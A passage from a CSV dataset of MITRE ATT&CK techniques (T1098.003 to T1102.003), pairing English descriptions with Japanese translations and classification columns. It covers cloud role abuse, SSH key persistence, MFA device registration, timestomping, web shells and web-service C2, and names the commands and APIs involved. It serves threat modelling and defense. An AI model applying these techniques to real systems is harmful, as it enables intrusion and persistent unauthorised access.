例えば、侵害されたビジネスアカウントは、ターゲット企業のネットワーク内の他のアカウントにメッセージを送信するために使用されることが多く、受信トレイルール（例：[内部スピアフィッシング](https://attack.mitre.org/techniques/T1534)）を作成することで、メッセージがスパム/フィッシング検知メカニズムを回避します。(引用: Bienstock, D. - Defending O365 - 2019)",persistence;privilege-escalation,Windows;Office Suite,script_command_execution,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity;email_infrastructure;cloud_control_plane;saas_in_use,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306,2020-01-19T16:54:28.516Z,2025-04-15T21:47:23.761Z,,,,
T1098.003,T1098,Additional Cloud Roles,追加のクラウド役割,"An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker) (Citation: Microsoft O365 Admin Roles) This account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts. For example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation) In some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)","攻撃者は、テナントへの持続的なアクセスを維持するため、攻撃者が制御するクラウドアカウントに追加の役割や権限を追加する場合があります。例えば、クラウド環境ではIAMポリシーを更新したり、Office 365環境では新しいグローバル管理者を追加したりすることがあります。(引用: AWS IAM Policies and Permissions)(引用元: Google Cloud IAM Policies)(引用元: Microsoft Support O365 Add Another Admin, October 2019)(引用元: Microsoft O365 Admin Roles)十分な権限があれば、侵害されたアカウントはデータや設定に対してほぼ無制限のアクセス権を得られる（他の管理者のパスワードをリセットする権限を含む）。(引用元: Expel AWS Attacker) (引用元: Microsoft O365 Admin Roles) このアカウント変更は、[アカウントの作成](https://attack.mitre.org/techniques/T1136)やその他の悪意のあるアカウント操作に直後に続く可能性があります。攻撃者は、侵害済みの既存の[有効なアカウント](https://attack.mitre.org/techniques/T1078)を変更することもあります。これにより特権昇格が発生する可能性があり、特に追加されたロールが他のアカウントへの横方向の移動を許可している場合に顕著です。 例えばAWS環境では、適切な権限を持つ攻撃者が<code>CreatePolicyVersion</code> APIを使用してIAMポリシーの新バージョンを定義したり、<code>AttachUserPolicy</code> APIで侵害済みユーザーアカウントに追加／異なる権限を持つIAMポリシーを紐付けたりできる。(引用元: Rhino Security Labs AWS Privilege Escalation) 場合によっては、攻撃者は被害者クラウドテナント外の攻撃者管理アカウントにロールを追加することがあります。これにより、攻撃者が[アカウント作成](https://attack.mitre.org/techniques/T1136)や被害者所有アカウントの改変を必要とせずに、これらの外部アカウントが被害者テナント内で操作を実行できるようになります。（引用元：Invictus IR DangerDev 2024）",persistence;privilege-escalation,IaaS;SaaS;Office Suite;Identity Provider,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;network_connectivity;email_infrastructure;cloud_control_plane;saas_in_use,specified,Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud,subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3,2020-01-19T16:59:45.362Z,2025-04-15T21:46:09.054Z,,,,
T1098.004,T1098,SSH Authorized Keys,SSH認証キー,"Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions, macOS, and ESXi hypervisors commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code> (or, on ESXi, `/etc/ssh/keys-<username>/authorized_keys`).(Citation: SSH Authorized Keys) Users may edit the system’s SSH config file to modify the directives `PubkeyAuthentication` and `RSAAuthentication` to the value `yes` to ensure public key and RSA authentication are enabled, as well as modify the directive `PermitRootLogin` to the value `yes` to enable root authentication via SSH.(Citation: Broadcom ESXi SSH) The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>. Adversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s “add-metadata Ecommand an adversary may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user. Where authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. SSH keys can also be added to accounts on network devices, such as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)",攻撃者は、被害者ホストへの永続性を維持するためにSSHの<code>authorized_keys</code>ファイルを改変する可能性があります。Linuxディストリビューション、macOS、およびESXiハイパーバイザーは、リモート管理のためのSSHセッションの認証プロセスを保護するために、一般的に鍵ベース認証を使用します。SSHの<code>authorized_keys</code>ファイルは、そのファイルが設定されているユーザーアカウントへのログインに使用できるSSH鍵を指定します。 このファイルは通常、ユーザーのホームディレクトリ内の<code>&lt;user-home&gt;/.ssh/authorized_keys</code>（ESXiでは`/etc/ssh/keys-<username>/authorized_keys`）に存在します。(引用元: SSH Authorized Keys) ユーザーはシステムのSSH設定ファイルを編集し、`PubkeyAuthentication` および `RSAAuthentication` ディレクティブを `yes` に変更して公開鍵認証とRSA認証を有効化できるほか、`PermitRootLogin` ディレクティブを `yes` に変更してSSH経由のroot認証を有効化できます。(引用元: Broadcom ESXi SSH) SSH設定ファイルは通常`/etc/ssh/sshd_config`にあります。攻撃者はスクリプトやシェルコマンドでSSH`authorized_keys`ファイルを直接改変し、自身の公開鍵を追加する可能性があります。 クラウド環境では、攻撃者はコマンドラインインターフェースやREST APIを介して特定の仮想マシンのSSH authorized_keysファイルを変更できる可能性があります。例えば、Google Cloud CLIの「add-metadata」コマンドを使用することで、攻撃者はユーザーアカウントにSSHキーを追加できます。(引用元: Google Cloud Add Metadata)(引用元: Google Cloud Privilege Escalation) 同様に、Azureでは攻撃者がAPIへのPATCHリクエストを介して仮想マシンのauthorized_keysファイルを更新できる。(引用元: Azure Update Virtual Machines) これにより、対応する秘密鍵を保持する攻撃者は既存ユーザーとしてSSH経由でログイン可能となる。(引用: Venafi SSH Key Abuse)(引用: Cybereason Linux Exim Worm) 仮想マシンやインスタンスが要求ユーザーとは異なる権限を持つ場合、権限昇格につながる可能性もある。クラウドAPIやコマンドラインインターフェース経由でauthorized_keysファイルが変更される場合、攻撃者はより高い権限を持つユーザーにキーを追加することで、対象仮想マシン上で権限昇格を達成できる。 SSH鍵はネットワーク機器のアカウントにも追加可能であり、`ip ssh pubkey-chain` [ネットワーク機器CLI](https://attack.mitre.org/techniques/T1059/008)コマンドなどが該当する。(引用: cisco_ip_ssh_pubkey_ch_cmd),persistence;privilege-escalation,Linux;macOS;IaaS;Network Devices;ESXi,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--6b57dc31-b814-4a03-8706-28bc20d739c4,2020-06-24T12:42:35.144Z,2025-04-15T19:58:39.342Z,,,,
T1098.005,T1098,Device Registration,デバイス登録,"Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance. MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft 365 2022) Similarly, an adversary with existing access to a network may register a device to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537) Devices registered in Entra ID may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Entra ID tenant by registering a large number of devices.(Citation: AADInternals - BPRT)",攻撃者は、攻撃者が制御するアカウントにデバイスを登録する可能性があります。デバイスは、ネットワークへの認証を処理する多要素認証（MFA）システム、またはデバイスへのアクセスとコンプライアンスを処理するデバイス管理システムに登録される場合があります。DuoやOktaなどのMFAシステムでは、ユーザーがMFA要件を満たすためにデバイスをアカウントに関連付けることが可能です。 ユーザーの認証情報を侵害した攻撃者は、新規デバイスを登録することで初期MFA要件を迂回し、ネットワークへの持続的アクセスを獲得する可能性がある。(引用元: CISA MFA PrintNightmare)(引用元: DarkReading FireEye SolarWinds) 場合によっては、MFAの自己登録プロセスでは、アカウントの最初のデバイス登録や非アクティブアカウントへのデバイス登録に、ユーザー名とパスワードのみが必要となることがある。 (引用元: Mandiant APT29 Microsoft 365 2022) 同様に、ネットワークへの既存アクセス権を持つ攻撃者は、条件付きアクセスポリシーを迂回しつつ機密データやリソースにアクセスするため、Entra IDおよび／またはそのデバイス管理システムであるMicrosoft Intuneにデバイスを登録する可能性があります。(引用元: AADInternals - Device Registration)(引用元: AADInternals - Conditional Access Bypass)(引用元: Microsoft DEV-0537) Entra IDに登録されたデバイスは、組織内メールを介した[内部スピアフィッシング](https://attack.mitre.org/techniques/T1534)キャンペーンを実行できる可能性があり、メールクライアントによって不審と見なされる可能性が低くなります。(引用元: Microsoft - Device Registration) さらに、攻撃者は大量のデバイスを登録することで、Entra IDテナントに対して[サービス枯渇攻撃](https://attack.mitre.org/techniques/T1499/002)を実行できる可能性があります。(引用元: AADInternals - BPRT),persistence;privilege-escalation,Windows;Identity Provider,credential_abuse,privilege_gain,authentication_system;mfa_in_use;user_interaction;endpoint_execution;endpoint_management;network_connectivity;email_infrastructure;saas_in_use,specified,Business Workstation;Mail / Collaboration;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--7decb26c-715c-40cf-b7e0-026f7d7cc215,2022-03-04T18:30:38.989Z,2025-04-15T22:17:39.860Z,,,,
T1098.006,T1098,Additional Container Cluster Roles,追加のコンテナクラスターロール,"An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC) This account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. Note that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",攻撃者は、コンテナオーケストレーションシステムへの永続的なアクセスを維持するため、攻撃者が制御するユーザーまたはサービスアカウントに追加のロールや権限を追加する可能性があります。例えば、十分な権限を持つ攻撃者は、ロールまたはクラスターロールをKubernetesアカウントにバインドするためにRoleBindingまたはClusterRoleBindingを作成できます。(引用元: Kubernetes RBAC)(引用元: Aquasec Kubernetes Attack 2023)属性ベースのアクセス制御（ABAC）が使用されている場合、十分な権限を持つ攻撃者はKubernetes ABACポリシーを変更し、標的アカウントに追加の権限を付与することが可能です。(引用元: Kuberentes ABAC) このアカウント改変は、[アカウント作成](https://attack.mitre.org/techniques/T1136) その他の悪意あるアカウント操作に直後に続く可能性があります。攻撃者は、既に侵害済みの既存の[有効なアカウント](https://attack.mitre.org/techniques/T1078) を改変することも可能です。 Google Kubernetes Engine、Amazon Elastic Kubernetes Service、Azure Kubernetes Service などのクラウド環境にコンテナオーケストレーションシステムが展開されている場合、ローカル権限割り当ての代わりに、またはそれに加えて、クラウドベースのロールベースアクセス制御（RBAC）割り当てや ABAC ポリシーが使用されることが多いことに注意してください。(引用元: Google Cloud Kubernetes IAM)(引用元: AWS EKS IAM Roles for Service Accounts)(引用元: Microsoft Azure Kubernetes Service Service Accounts) この場合、この手法は[追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003)と組み合わせて使用することができます。,persistence;privilege-escalation,Containers,config_policy_manipulation,privilege_gain,user_interaction;cloud_control_plane,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64,2023-07-14T14:01:50.806Z,2025-04-15T21:46:31.661Z,,,,
T1098.007,T1098,Additional Local or Domain Groups,追加のローカルまたはドメイングループ,"An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain. On Windows, accounts may use the `net localgroup` and `net group` commands to add existing users to local and domain groups.(Citation: Microsoft Net Localgroup)(Citation: Microsoft Net Group) On Linux, adversaries may use the `usermod` command for the same purpose.(Citation: Linux Usermod) For example, accounts may be added to the local administrators group on Windows devices to maintain elevated privileges. They may also be added to the Remote Desktop Users group, which allows them to leverage [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) to log into the endpoints in the future.(Citation: Microsoft RDP Logons) On Linux, accounts may be added to the sudoers group, allowing them to persistently leverage [Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003) for elevated privileges. In Windows environments, machine accounts may also be added to domain groups. This allows the local SYSTEM account to gain privileges on the domain.(Citation: RootDSE AD Detection 2022)",攻撃者は、システムやドメインへの永続的なアクセスを維持するため、攻撃者が制御するアカウントに追加のローカルグループまたはドメイングループを追加する場合があります。Windowsでは、`net localgroup`および`net group`コマンドを使用して既存のユーザーをローカルグループやドメイングループに追加できます。(引用: Microsoft Net Localgroup)(引用: Microsoft Net Group) Linuxでは、攻撃者は同じ目的で`usermod`コマンドを使用する場合があります。(引用元: Linux Usermod) 例えば、Windowsデバイスではローカル管理者グループにアカウントを追加することで昇格された権限を維持できる。またリモートデスクトップユーザーグループに追加すれば、[リモートデスクトッププロトコル](https://attack.mitre.org/techniques/T1021/001)を利用して将来的にエンドポイントにログインできるようになる。(引用元: Microsoft RDP Logons) Linuxでは、アカウントをsudoersグループに追加することで、[SudoとSudoキャッシュ](https://attack.mitre.org/techniques/T1548/003)を永続的に活用し、昇格された特権を得ることが可能になります。 Windows環境では、マシンアカウントをドメイングループに追加することも可能です。これによりローカルのSYSTEMアカウントがドメイン上で特権を取得できます。(引用元: RootDSE AD Detection 2022),persistence;privilege-escalation,Windows;macOS;Linux,remote_service_abuse,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--3e6831b2-bf4c-4ae6-b328-2e7c6633b291,2024-08-05T20:49:49.809Z,2025-04-15T21:47:40.787Z,,,,
T1099,,Timestomp,タイムスタンプ,"Adversaries may take actions to hide the deployment of new, or modification of existing files to obfuscate their activities. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools. (Citation: WindowsIR Anti-Forensic Techniques)",攻撃者は、自身の活動を隠蔽するため、新規ファイルの展開や既存ファイルの改変を隠す行動を取る可能性があります。タイムスタンプ改ざん（Timestomping）は、ファイルのタイムスタンプ（最終変更時刻、最終アクセス時刻、作成時刻、変更時刻）を改変する技術であり、多くの場合、同一フォルダ内のファイルを模倣するために使用されます。 例えば、攻撃者が改変または作成したファイルに対してこの手法を用いることで、フォレンジック調査員やファイル分析ツールに不審な痕跡を残さないようにします。タイムスタンプ改ざんは、マルウェアやツールを隠蔽するためにファイル名偽装[Masquerading](https://attack.mitre.org/techniques/T1036)と併用される場合があります。（引用元: WindowsIR Anti-Forensic Techniques）,defense-evasion,Linux;Windows;macOS,defense_disable,stealth,file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--128c55d3-aeba-469f-bd3e-c8996ab4112a,2017-05-31T21:31:12.675Z,2025-04-25T15:15:10.626Z,,,,
T1100,,Web Shell,Webシェル,"A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013) Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.",Webシェルとは、公開アクセス可能なWebサーバー上に配置されるWebスクリプトであり、攻撃者がWebサーバーをネットワークへのゲートウェイとして利用できるようにするものである。 Webシェルは、Webサーバーをホストするシステム上で実行可能な一連の機能やコマンドラインインターフェースを提供する場合がある。サーバーサイドスクリプトに加え、WebシェルにはWebサーバーとの通信に使用されるクライアントインターフェースプログラムが存在する可能性がある（例：China Chopper Webシェルクライアント）。 （引用：Lee 2013）Webシェルは、攻撃者の主要なアクセス手段が検知・除去された場合に備えた[冗長アクセス](https://attack.mitre.org/techniques/T1108)手段、あるいは永続化メカニズムとして機能する可能性がある。,persistence;privilege-escalation,Linux;Windows;macOS,script_command_execution,privilege_gain,endpoint_execution;network_connectivity,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--c16e5409-ee53-4d79-afdc-4099dc9292df,2017-05-31T21:31:13.061Z,2025-04-25T15:16:06.131Z,,,,
T1101,,Security Support Provider,セキュリティサポートプロバイダー,"Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called. (Citation: Graeber 2014)",Windows セキュリティサポートプロバイダ (SSP) DLL は、システム起動時にローカルセキュリティ機関 (LSA) プロセスにロードされます。LSA にロードされると、SSP DLL は、ログオンしているユーザーのドメインパスワードやスマートカードの PIN など、Windows に保存されている暗号化されたパスワードや平文のパスワードにアクセスできます。 SSP 構成は、2 つのレジストリキーに保存されます。<code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> および <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code> です。 攻撃者はこれらのレジストリキーを改変し、新しいSSPを追加することが可能です。追加されたSSPは、システムの次回起動時、またはAddSecurityPackage Windows API関数が呼び出された際にロードされます。(引用: Graeber 2014),persistence,Windows,credential_abuse,foothold,authentication_system;user_interaction;endpoint_execution;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--6c174520-beea-43d9-aac6-28fb77f3e446,2017-05-31T21:31:13.447Z,2025-04-25T15:15:41.535Z,,,,
T1102,,Web Service,Webサービス,"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: Broadcom BirdyClient Microsoft Graph API 2024) Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",攻撃者は、侵害されたシステムとの間でデータを中継する手段として、既存の正当な外部Webサービスを利用することがあります。人気のあるウェブサイト、クラウドサービス、ソーシャルメディアがC2のメカニズムとして機能する場合、ネットワーク内のホストが侵害前に既にそれらと通信している可能性が高いため、相当なカモフラージュ効果をもたらします。Google、Microsoft、Twitterなどが提供する一般的なサービスを利用することで、攻撃者は予想されるノイズの中に潜むことが容易になります。（引用元：Broadcom BirdyClient Microsoft Graph API 2024）Webサービスプロバイダーは一般的にSSL/TLS暗号化を使用するため、攻撃者には追加の保護層が提供される。Webサービスの利用は、マルウェアのバイナリ解析によるバックエンドC2インフラの発見を回避すると同時に、運用上の回復力（このインフラは動的に変更可能であるため）も実現する。,command-and-control,Linux;macOS;Windows;ESXi,destructive_impact,remote_control,network_connectivity;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--830c9528-df21-472c-8c14-a036bf17d665,2017-05-31T21:31:13.915Z,2025-04-15T19:58:47.211Z,,,,
T1102.001,T1102,Dead Drop Resolver,デッドドロップ解決サービス,"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",攻撃者は既存の正当な外部Webサービスを利用し、追加のコマンドアンドコントロール（C2）インフラを指す情報をホストすることがある。攻撃者は「デッドドロップリゾルバー」と呼ばれるコンテンツを、埋め込まれた（しばしば難読化/暗号化された）ドメインやIPアドレスと共にWebサービス上に投稿する。感染した被害者はこれらのリゾルバーに接続し、リダイレクトされる。 C2のメカニズムとして機能する人気ウェブサイトやソーシャルメディアは、ネットワーク内のホストが侵害前に既にそれらと通信している可能性が高いため、かなりの隠蔽効果をもたらす。GoogleやTwitterが提供するような一般的なサービスを利用することで、敵対者は予想されるノイズの中に潜むことが容易になる。Webサービスプロバイダーは一般的にSSL/TLS暗号化を使用しており、敵対者に追加の保護層を提供する。 デッドドロップリゾルバーの使用は、マルウェアのバイナリ解析によるバックエンドC2インフラの発見を防ぐと同時に、運用上の回復力（このインフラは動的に変更可能であるため）を実現する。,command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--f7827069-0bf2-4764-af4f-23fae0d181b7,2020-03-14T22:24:21.841Z,2025-04-25T14:48:36.031Z,,,,
T1102.002,T1102,Bidirectional Communication,双方向通信,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",敵対者は、既存の正当な外部Webサービスを、侵害されたシステムへのコマンド送信および出力受信の手段としてWebサービスチャネル経由で利用する可能性がある。侵害されたシステムは、人気のあるウェブサイトやソーシャルメディアを活用してコマンドアンドコントロール（C2）指示をホストする。感染したシステムは、それらのコマンドからの出力をそのWebサービスチャネル経由で送信できる。戻りトラフィックは、利用されるWebサービスに応じて様々な方法で発生する可能性がある。 例えば、フォーラムへのコメント投稿、開発プロジェクトへのプルリクエスト発行、Webサービス上のドキュメント更新、ツイート送信といった形で返送トラフィックが発生する可能性がある。 C2のメカニズムとして機能する人気ウェブサイトやソーシャルメディアは、ネットワーク内のホストが侵害前に既にそれらと通信している可能性が高いため、かなりの隠蔽効果をもたらす可能性があります。GoogleやTwitterが提供するような一般的なサービスを利用することで、攻撃者は予想されるノイズの中に潜むことが容易になります。Webサービスプロバイダーは一般的にSSL/TLS暗号化を使用しており、攻撃者に追加の保護層を提供します。,command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--be055942-6e63-49d7-9fa1-9cb7d8a8f3f4,2020-03-14T22:34:03.024Z,2025-04-25T14:47:51.598Z,,,,
T1102.003,T1102,One-Way Communication,一方向通信,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",攻撃者は、既存の正当な外部Webサービスを、Webサービスチャネル経由で返答を受け取ることなく、侵害されたシステムにコマンドを送信する手段として利用する可能性がある。侵害されたシステムは、人気のあるウェブサイトやソーシャルメディアを利用してコマンドアンドコントロール（C2）指示をホストする可能性がある。感染したシステムは、それらのコマンドからの出力を別のC2チャネル（別の独立したWebサービスを含む）経由で送信することを選択する場合がある。 あるいは、攻撃者がシステムに指示を送信するのみで応答を必要としない場合、侵害システムは一切の出力を返さないこともあります。C2の手段として機能する人気ウェブサイトやソーシャルメディアは、ネットワーク内のホストが侵害前から既にそれらと通信している可能性が高いため、かなりの隠蔽効果をもたらします。GoogleやTwitterが提供するような一般的なサービスを利用することで、攻撃者は予想されるノイズの中に潜むことが容易になります。 WebサービスプロバイダーはSSL/TLS暗号化を一般的に使用しており、攻撃者に追加の保護層を提供します。,command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--9c99724c-a483-4d60-ad9d-7f004e42e8e8,2020-03-14T22:45:52.963Z,2025-04-25T14:47:30.432Z,,,,
